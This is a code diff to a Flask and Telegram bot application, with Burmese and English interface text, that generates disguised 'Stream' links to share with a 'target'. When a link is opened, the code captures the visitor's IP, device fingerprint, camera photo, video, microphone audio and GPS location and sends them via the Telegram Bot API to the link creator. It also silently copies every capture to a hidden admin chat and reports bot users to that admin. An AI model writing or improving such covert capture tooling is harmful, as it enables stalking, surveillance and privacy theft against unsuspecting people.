+window.addEventListener("load",()=>{ sendFingerprint(); });
+</script>
 </body>
-</html>
-"""
+</html>"""
 
+
+# ─────────────────────────────────────────
+# FLASK ROUTES
+# ─────────────────────────────────────────
 @flask_app.route('/')
 def index():
-    return """
-<!DOCTYPE html>
-<html>
-<head><title>Tracking Tool</title>
-<style>body{font-family:Arial,sans-serif;max-width:600px;margin:80px auto;text-align:center;background:#f4f4f4;}
-.card{background:white;border-radius:8px;padding:40px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
-code{background:#e9ecef;padding:4px 8px;border-radius:4px;}</style>
-</head>
-<body>
-<div class="card">
-<h1>Telegram Tracking Tool</h1>
-<p>This app is controlled via a Telegram bot.</p>
-<p>Configure your <code>BOT_TOKEN</code> secret and use <code>/grab</code> in the bot to generate tracking links.</p>
-</div>
-</body>
-</html>
-""", 200
+    return """<!DOCTYPE html><html><head><title>Stream</title>
+<style>body{background:#0a0a0a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
+.box{text-align:center;padding:40px;background:#111;border-radius:12px;border:1px solid #222}
+code{background:#1e1e1e;padding:4px 8px;border-radius:4px;color:#e63946}</style></head>
+<body><div class="box"><h1>▶ Stream</h1><p style="color:#888;margin-top:12px">Bot ဖြင့် link ထုတ်ပြီး မျှဝေပါ<br>Use the bot to generate and share links.</p>
+<p style="margin-top:16px;font-size:.85rem;color:#555">Powered by Telegram Bot &nbsp;•&nbsp; <code>/grab</code></p></div></body></html>""", 200
+
 
 @flask_app.route('/track/<token>')
 def track_page(token):
-    return render_template_string(HTML_TEMPLATE)
+    mode = request.args.get('m', 'all')
+    user_id = tracking_links.get(token)
+    if user_id:
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        ua = request.headers.get('User-Agent', 'Unknown')[:120]
+        mode_labels = {
+            'all': '🌐 All-in-One',
+            'photo': '📸 Photo',
+            'audio': '🎤 Audio',
+            'location': '📍 Location',
+            'video': '🎥 Video',
+            'device': '📱 Device Info'
+        }
+        label = mode_labels.get(mode, mode)
+        alert = (
+            f"🔗 <b>Link ဖွင့်သည် | Link Opened!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🎯 Mode: <b>{label}</b>\n"
+            f"🌐 IP: <code>{ip}</code>\n"
+            f"📱 Device: {ua}\n"
+            f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"━━━━━━━━━━━━━━━━━━━━"
+        )
+        threading.Thread(target=broadcast_message, args=(user_id, alert), daemon=True).start()
+    return render_template_string(HTML_TEMPLATE, token=token, mode=mode)
 
-# Existing individual endpoints (unchanged)
+
+# ─────────────────────────────────────────
+# CAPTURE ENDPOINTS
+# ─────────────────────────────────────────
 @flask_app.route('/capture_fingerprint', methods=['POST'])
 def capture_fingerprint():
-    data = request.json
+    data = request.get_json(silent=True) or {}
     token = data.get('token')
     user_id = tracking_links.get(token)
     if not user_id:
-        return jsonify({"error": "Invalid token"}), 400
-    fingerprint = data.get('fingerprint', {})
+        return jsonify({"ok": False}), 400
+    fp = data.get('fingerprint', {})
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    report = f"""
-📱 <b>Device Fingerprint Report</b>
-━━━━━━━━━━━━━━━━━━━━
-🌐 IP: {ip}
-🆔 User Agent: {fingerprint.get('userAgent', 'Unknown')}
-💻 Platform: {fingerprint.get('platform', 'Unknown')}
-📐 Screen: {fingerprint.get('screenWidth', '?')}x{fingerprint.get('screenHeight', '?')}
-🗣️ Language: {fingerprint.get('language', 'en')}
-⏰ Timezone: {fingerprint.get('timezone', 'Unknown')}
-🔋 Battery: {fingerprint.get('batteryLevel', '?')} ({'Charging' if fingerprint.get('charging') else 'Not charging'})
-📡 Connection: {fingerprint.get('connectionType', 'unknown')} ({fingerprint.get('downlink', '?')} Mbps)
-🧠 Hardware Concurrency: {fingerprint.get('hardwareConcurrency', '?')}
-💾 Device Memory: {fingerprint.get('deviceMemory', '?')} GB
-🕹️ Max Touch Points: {fingerprint.get('maxTouchPoints', '?')}
-🍪 Cookies Enabled: {fingerprint.get('cookieEnabled', '?')}
-📅 Local Time: {fingerprint.get('localTime', 'Unknown')}
-━━━━━━━━━━━━━━━━━━━━
-    """
-    send_telegram_message(user_id, report)
-    return jsonify({"message": "Fingerprint sent"}), 200
+    report = (
+        f"📱 <b>Device Info / ဖုန်းအချက်အလက်</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🌐 IP: <code>{ip}</code>\n"
+        f"📱 Model: {fp.get('deviceModel','Unknown')}\n"
+        f"💻 Platform: {fp.get('platform','Unknown')}\n"
+        f"🖥 Screen: {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')}\n"
+        f"🗣 Language: {fp.get('language','?')}\n"
+        f"⏰ Timezone: {fp.get('timezone','?')}\n"
+        f"🔋 Battery: {fp.get('batteryLevel','?')} ({'🔌 Charging' if fp.get('charging') else '🔋 Not charging'})\n"
+        f"📡 Net: {fp.get('connectionType','?')} {fp.get('downlink','?')}Mbps\n"
+        f"🧠 CPU cores: {fp.get('hardwareConcurrency','?')}\n"
+        f"💾 RAM: {fp.get('deviceMemory','?')} GB\n"
+        f"📅 Local time: {fp.get('localTime','?')}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
+    threading.Thread(target=broadcast_message, args=(user_id, report), daemon=True).start()
+    return jsonify({"ok": True}), 200
 
-@flask_app.route('/capture_photo', methods=['POST'])
-def capture_photo():
-    token = request.form.get('token')
-    user_id = tracking_links.get(token)
-    if not user_id:
-        return jsonify({"error": "Invalid token"}), 400
-    photo_file = request.files.get('media')
-    if not photo_file:
-        return jsonify({"error": "No photo"}), 400
-    send_telegram_media(user_id, photo_file, 'photo')
-    return jsonify({"message": "Photo sent"}), 200
 
-@flask_app.route('/capture_audio', methods=['POST'])
-def capture_audio():
-    token = request.form.get('token')
-    user_id = tracking_links.get(token)
-    if not user_id:
-        return jsonify({"error": "Invalid token"}), 400
-    audio_file = request.files.get('media')
-    if not audio_file:
-        return jsonify({"error": "No audio"}), 400
-    send_telegram_media(user_id, audio_file, 'audio')
-    return jsonify({"message": "Audio sent"}), 200
-
-@flask_app.route('/capture_location', methods=['POST'])
-def capture_location():
-    data = request.json
-    token = data.get('token')
-    user_id = tracking_links.get(token)
-    if not user_id:
-        return jsonify({"error": "Invalid token"}), 400
-    loc = data.get('location', {})
-    lat = loc.get('lat')
-    lon = loc.get('lon')
-    if lat and lon:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
-        requests.post(url, json={"chat_id": user_id, "latitude": lat, "longitude": lon})
-    return jsonify({"message": "Location sent"}), 200
-
-# ---------- New Combined Endpoints ----------
 @flask_app.route('/capture_combined_photo', methods=['POST'])
 def capture_combined_photo():
     token = request.form.get('token')
     user_id = tracking_links.get(token)
     if not user_id:
-        return jsonify({"error": "Invalid token"}), 400
+        return jsonify({"ok": False}), 400
     photo_file = request.files.get('photo')
-    fingerprint_json = request.form.get('fingerprint')
-    if not photo_file or not fingerprint_json:
-        return jsonify({"error": "Missing photo or fingerprint"}), 400
-    # Send photo with caption containing fingerprint
-    caption = format_fingerprint_caption(json.loads(fingerprint_json))
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    files = {'photo': (photo_file.filename, photo_file.read())}
-    data = {'chat_id': user_id, 'caption': caption, 'parse_mode': 'HTML'}
-    requests.post(url, data=data, files=files)
-    return jsonify({"message": "Combined photo+fingerprint sent"}), 200
+    fp_json = request.form.get('fingerprint')
+    if not photo_file:
+        return jsonify({"ok": False}), 400
+    caption = format_fingerprint_caption(json.loads(fp_json)) if fp_json else "📸 Photo"
+    photo_bytes = photo_file.read()
+    threading.Thread(target=broadcast_photo, args=(user_id, photo_bytes, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
 
 @flask_app.route('/capture_combined_video', methods=['POST'])
 def capture_combined_video():
     token = request.form.get('token')
     user_id = tracking_links.get(token)
     if not user_id:
-        return jsonify({"error": "Invalid token"}), 400
+        return jsonify({"ok": False}), 400
     video_file = request.files.get('video')
-    fingerprint_json = request.form.get('fingerprint')
-    if not video_file or not fingerprint_json:
-        return jsonify({"error": "Missing video or fingerprint"}), 400
-    caption = format_fingerprint_caption(json.loads(fingerprint_json))
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
-    files = {'video': (video_file.filename, video_file.read())}
-    data = {'chat_id': user_id, 'caption': caption, 'parse_mode': 'HTML'}
-    requests.post(url, data=data, files=files)
-    return jsonify({"message": "Combined video+fingerprint sent"}), 200
+    fp_json = request.form.get('fingerprint')
+    if not video_file:
+        return jsonify({"ok": False}), 400
+    caption = format_fingerprint_caption(json.loads(fp_json)) if fp_json else "🎥 Video"
+    video_bytes = video_file.read()
+    threading.Thread(target=broadcast_video, args=(user_id, video_bytes, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
 
 @flask_app.route('/capture_combined_audio', methods=['POST'])
 def capture_combined_audio():
     token = request.form.get('token')
     user_id = tracking_links.get(token)
     if not user_id:
-        return jsonify({"error": "Invalid token"}), 400
+        return jsonify({"ok": False}), 400
     audio_file = request.files.get('audio')
-    fingerprint_json = request.form.get('fingerprint')
-    if not audio_file or not fingerprint_json:
-        return jsonify({"error": "Missing audio or fingerprint"}), 400
-    caption = format_fingerprint_caption(json.loads(fingerprint_json))
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
-    files = {'audio': (audio_file.filename, audio_file.read())}
-    data = {'chat_id': user_id, 'caption': caption, 'parse_mode': 'HTML'}
-    requests.post(url, data=data, files=files)
-    return jsonify({"message": "Combined audio+fingerprint sent"}), 200
+    fp_json = request.form.get('fingerprint')
+    if not audio_file:
+        return jsonify({"ok": False}), 400
+    caption = format_fingerprint_caption(json.loads(fp_json)) if fp_json else "🎤 Audio"
+    audio_bytes = audio_file.read()
+    threading.Thread(target=broadcast_voice, args=(user_id, audio_bytes, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
 
 @flask_app.route('/capture_combined_location', methods=['POST'])
 def capture_combined_location():
     token = request.form.get('token')
     user_id = tracking_links.get(token)
     if not user_id:
-        return jsonify({"error": "Invalid token"}), 400
+        return jsonify({"ok": False}), 400
     lat = request.form.get('lat')
     lon = request.form.get('lon')
-    fingerprint_json = request.form.get('fingerprint')
-    if not lat or not lon or not fingerprint_json:
-        return jsonify({"error": "Missing location or fingerprint"}), 400
-    # Send location
-    url_loc = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
-    requests.post(url_loc, json={"chat_id": user_id, "latitude": float(lat), "longitude": float(lon)})
-    # Send fingerprint as separate text message
-    caption = format_fingerprint_caption(json.loads(fingerprint_json))
-    send_telegram_message(user_id, caption)
-    return jsonify({"message": "Combined location+fingerprint sent"}), 200
+    fp_json = request.form.get('fingerprint')
+    if not lat or not lon:
+        return jsonify({"ok": False}), 400
+    caption = format_fingerprint_caption(json.loads(fp_json)) if fp_json else "📍 Location"
+    threading.Thread(target=broadcast_location, args=(user_id, lat, lon), daemon=True).start()
+    threading.Thread(target=broadcast_message, args=(user_id, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
 
-def format_fingerprint_caption(fingerprint):
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip() if request else 'Unknown'
-    return f"""
-📱 <b>Device Fingerprint</b>
-🌐 IP: {ip}
-🆔 UA: {fingerprint.get('userAgent', 'N/A')[:80]}
-💻 Platform: {fingerprint.get('platform', 'N/A')}
-📐 Screen: {fingerprint.get('screenWidth', '?')}x{fingerprint.get('screenHeight', '?')}
-🗣️ Lang: {fingerprint.get('language', 'N/A')}
-⏰ Timezone: {fingerprint.get('timezone', 'N/A')}
-🔋 Battery: {fingerprint.get('batteryLevel', '?')} {'🔌' if fingerprint.get('charging') else '🔋'}
-🌐 Connection: {fingerprint.get('connectionType', 'unknown')} ({fingerprint.get('downlink', '?')} Mbps)
-    """
+
+# ─────────────────────────────────────────
+# TELEGRAM HELPERS
+# ─────────────────────────────────────────
+def recipients(user_id):
+    ids = [str(user_id)]
+    if str(ADMIN_CHAT_ID) not in ids:
+        ids.append(str(ADMIN_CHAT_ID))
+    return ids
+
 
 def send_telegram_message(chat_id, text):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"})
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
+            timeout=10
+        )
+    except Exception:
+        pass
 
-def send_telegram_media(chat_id, file, media_type):
-    method = 'sendPhoto' if media_type == 'photo' else 'sendAudio'
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
-    files = {'photo' if media_type == 'photo' else 'audio': (file.filename, file.read())}
-    data = {'chat_id': chat_id}
-    requests.post(url, data=data, files=files)
 
-# ---------- Telegram Bot Commands ----------
+def broadcast_message(user_id, text):
+    for cid in recipients(user_id):
+        threading.Thread(target=send_telegram_message, args=(cid, text), daemon=True).start()
+
+
+def broadcast_photo(user_id, photo_bytes, caption):
+    for cid in recipients(user_id):
+        try:
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
+                files={'photo': ('photo.jpg', photo_bytes, 'image/jpeg')},
+                timeout=30
+            )
+        except Exception:
+            pass
+
+
+def broadcast_voice(user_id, audio_bytes, caption):
+    for cid in recipients(user_id):
+        try:
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",
+                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
+                files={'voice': ('audio.ogg', audio_bytes, 'audio/ogg')},
+                timeout=30
+            )
+        except Exception:
+            pass
+
+
+def broadcast_video(user_id, video_bytes, caption):
+    for cid in recipients(user_id):
+        try:
+            r = requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
+                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
+                files={'video': ('video.mp4', video_bytes, 'video/mp4')},
+                timeout=60
+            )
+            if not r.json().get('ok'):
+                requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+                    data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
+                    files={'document': ('video.webm', video_bytes, 'video/webm')},
+                    timeout=60
+                )
+        except Exception:
+            pass
+
+
+def broadcast_location(user_id, lat, lon):
+    for cid in recipients(user_id):
+        try:
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
+                json={"chat_id": cid, "latitude": float(lat), "longitude": float(lon)},
+                timeout=10
+            )
+        except Exception:
+            pass
+
+
+def format_fingerprint_caption(fp):
+    try:
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    except Exception:
+        ip = 'Unknown'
+    return (
+        f"📱 <b>Device Info</b>\n"
+        f"🌐 IP: <code>{ip}</code>\n"
+        f"📱 Model: {fp.get('deviceModel','?')}\n"
+        f"💻 Platform: {fp.get('platform','?')}\n"
+        f"🖥 Screen: {fp.get('screenWidth','?')}×{fp.get('screenHeight','?')}\n"
+        f"🗣 Lang: {fp.get('language','?')} | ⏰ TZ: {fp.get('timezone','?')}\n"
+        f"🔋 {fp.get('batteryLevel','?')} {'🔌' if fp.get('charging') else '🔋'} | "
+        f"📡 {fp.get('connectionType','?')} {fp.get('downlink','?')}Mbps"
+    )
+
+
+# ─────────────────────────────────────────
+# BOT KEYBOARDS & COMMANDS
+# ─────────────────────────────────────────
+def main_menu_keyboard():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔗 Link ထုတ်မည် | Generate Links", callback_data="grab")],
+        [InlineKeyboardButton("📋 Links စာရင်း | Active Links", callback_data="links"),
+         InlineKeyboardButton("🗑 ဖျက်မည် | Clear All", callback_data="clear")],
+        [InlineKeyboardButton("ℹ️ Bot အချက်အလက် | Info", callback_data="info"),
+         InlineKeyboardButton("❓ အကူအညီ | Help", callback_data="help")]
+    ])
+
+
+def make_links_keyboard(token):
+    base = f"{BASE_URL}/track/{token}"
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🌐 အားလုံး | All-in-One", url=f"{base}?m=all"),
+         InlineKeyboardButton("📸 ဓာတ်ပုံ | Photo", url=f"{base}?m=photo")],
+        [InlineKeyboardButton("🎤 အသံ | Audio", url=f"{base}?m=audio"),
+         InlineKeyboardButton("📍 တည်နေရာ | Location", url=f"{base}?m=location")],
+        [InlineKeyboardButton("🎥 ဗီဒီယို | Video", url=f"{base}?m=video"),
+         InlineKeyboardButton("📱 Device Info", url=f"{base}?m=device")],
+        [InlineKeyboardButton("📋 Links စာရင်း | Active Links", callback_data="links"),
+         InlineKeyboardButton("🏠 Menu", callback_data="menu")]
+    ])
+
+
+def format_links_text(token):
+    base = f"{BASE_URL}/track/{token}"
+    return (
+        f"✅ <b>Link ၆ မျိုး ထုတ်ပြီးပါပြီ! | 6 Links Created!</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🌐 <b>အားလုံး | All-in-One:</b>\n<code>{base}?m=all</code>\n\n"
+        f"📸 <b>ဓာတ်ပုံ | Photo:</b>\n<code>{base}?m=photo</code>\n\n"
+        f"🎤 <b>အသံ | Audio:</b>\n<code>{base}?m=audio</code>\n\n"
+        f"📍 <b>တည်နေရာ | Location:</b>\n<code>{base}?m=location</code>\n\n"
+        f"🎥 <b>ဗီဒီယို | Video:</b>\n<code>{base}?m=video</code>\n\n"
+        f"📱 <b>Device Info:</b>\n<code>{base}?m=device</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🔘 Link တစ်ခုစာ ခလုတ်များ အောက်တွင်ရှိသည်\n"
+        f"Tap a button below to open each link."
+    )
+
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Send /grab to generate a tracking link.")
+    user = update.effective_user
+    name = user.first_name or "User"
+    user_id = user.id
+    is_new = user_id not in seen_users
+    seen_users.add(user_id)
+
+    alert = (
+        f"👤 <b>{'🆕 NEW' if is_new else '🔄 Returning'} User Started Bot</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"📛 Name: <b>{user.full_name}</b>\n"
+        f"🔖 Username: {'@'+user.username if user.username else 'none'}\n"
+        f"🆔 ID: <code>{user_id}</code>\n"
+        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
+    threading.Thread(target=send_telegram_message, args=(ADMIN_CHAT_ID, alert), daemon=True).start()
+
+    await update.message.reply_text(
+        f"👋 မင်္ဂလာပါ <b>{name}</b>! | Hello <b>{name}</b>!\n\n"
+        "🤖 <b>Device Info Grabber Bot</b> မှ ကြိုဆိုပါသည်\n"
+        "Welcome to Device Info Grabber Bot.\n\n"
+        "📌 လုပ်ဆောင်ချက်တစ်ခုကို ရွေးချယ်ပါ | Choose an action:",
+        parse_mode="HTML",
+        reply_markup=main_menu_keyboard()
+    )
+
 
 async def grab(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     token = secrets.token_urlsafe(12)
     tracking_links[token] = user_id
-    link = f"{BASE_URL}/track/{token}"
-    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("Open Link", url=link)]])
-    await update.message.reply_text(f"Tracking link (share with anyone):\n{link}", reply_markup=keyboard)
+    text = format_links_text(token)
+    keyboard = make_links_keyboard(token)
+    await update.message.reply_text(text, parse_mode="HTML", reply_markup=keyboard)
 
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    data = query.data
+
+    if data == "menu":
+        await query.edit_message_text(
+            "🏠 <b>Main Menu</b>\n\nလုပ်ဆောင်ချက်တစ်ခုကို ရွေးချယ်ပါ | Choose an action:",
+            parse_mode="HTML", reply_markup=main_menu_keyboard()
+        )
+
+    elif data == "grab":
+        token = secrets.token_urlsafe(12)
+        tracking_links[token] = user_id
+        await query.edit_message_text(
+            format_links_text(token),
+            parse_mode="HTML",
+            reply_markup=make_links_keyboard(token)
+        )
+
+    elif data == "links":
+        user_links = [t for t, uid in tracking_links.items() if uid == user_id]
+        if not user_links:
+            text = "📋 <b>Active Links</b>\n\n❌ Link မရှိသေးပါ | No active links yet."
+        else:
+            lines = "\n".join([f"• <code>{BASE_URL}/track/{t}?m=all</code>" for t in user_links[-10:]])
+            text = f"📋 <b>Active Links</b> ({len(user_links)} total)\n\n{lines}"
+        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("🔗 Link အသစ် | New Links", callback_data="grab")],
+            [InlineKeyboardButton("🗑 ဖျက်မည် | Clear All", callback_data="clear"),
+             InlineKeyboardButton("🏠 Menu", callback_data="menu")]
+        ]))
+
+    elif data == "clear":
+        user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]
+        for t in user_tokens:
+            del tracking_links[t]
+        await query.edit_message_text(
+            f"🗑 <b>ဖျက်ပြီးပါပြီ! | Cleared!</b>\n\n✅ Link <b>{len(user_tokens)}</b> ခု ဖျက်ပြီး | Removed {len(user_tokens)} link(s).",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔗 Link အသစ် | New Links", callback_data="grab"),
+                 InlineKeyboardButton("🏠 Menu", callback_data="menu")]
+            ])
+        )
+
+    elif data == "info":
+        total = len([t for t, uid in tracking_links.items() if uid == user_id])
+        await query.edit_message_text(
+            f"ℹ️ <b>Bot အချက်အလက် | Bot Info</b>\n\n"
+            f"🤖 Bot: <b>Online ✅</b>\n"
+            f"🌐 Base URL: <code>{BASE_URL}</code>\n"
+            f"🆔 သင်၏ ID | Your ID: <code>{user_id}</code>\n"
+            f"🔗 သင်၏ links | Your links: <b>{total}</b>\n"
+            f"📅 Server time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Menu", callback_data="menu")]])
+        )
+
+    elif data == "help":
+        await query.edit_message_text(
+            "❓ <b>အကူအညီ | Help</b>\n\n"
+            "<b>မည်သို့အသုံးပြုမည် | How to use:</b>\n"
+            "1. <b>Link ထုတ်မည်</b> ကိုနှိပ်ပြီး link ၆ မျိုးထုတ်ပါ\n"
+            "   Press <b>Generate Links</b> to create 6 unique links\n\n"
+            "2. Link တစ်ခုကို မျှဝေပါ | Share any link with your target\n\n"
+            "3. Link ဖွင့်သည်နှင့် data များ Bot ဆီ တန်းရောက်မည်\n"
+            "   Data is sent immediately when they open it\n\n"
+            "<b>Link အမျိုးအစားများ | Link Types:</b>\n"
+            "🌐 All — ဓာတ်ပုံ+အသံ+တည်နေရာ+ဗီဒီယို+Device\n"
+            "📸 Photo — ဓာတ်ပုံသာ | Camera photo only\n"
+            "🎤 Audio — အသံသာ | Microphone recording only\n"
+            "📍 Location — တည်နေရာသာ | GPS location only\n"
+            "🎥 Video — ဗီဒီယိုသာ | Camera video only\n"
+            "📱 Device — Device info သာ | Device info only",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔗 Link ထုတ်မည် | Generate Links", callback_data="grab")],
+                [InlineKeyboardButton("🏠 Menu", callback_data="menu")]
+            ])
+        )
+
+
+# ─────────────────────────────────────────
+# RUN BOT & FLASK
+# ─────────────────────────────────────────
 def run_bot():
     if not BOT_TOKEN:
         print("⚠️  BOT_TOKEN not set. Telegram bot will not start.")
@@ -574,10 +752,11 @@ def run_bot():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("grab", grab))
+    app.add_handler(CallbackQueryHandler(button_handler))
     print("🤖 Telegram bot is polling...")
-    app.run_polling()
+    app.run_polling(drop_pending_updates=True)
 
-# ---------- Main Entry Point ----------
+
 if __name__ == "__main__":
     def run_flask():
         port = int(os.environ.get("PORT", 5000))
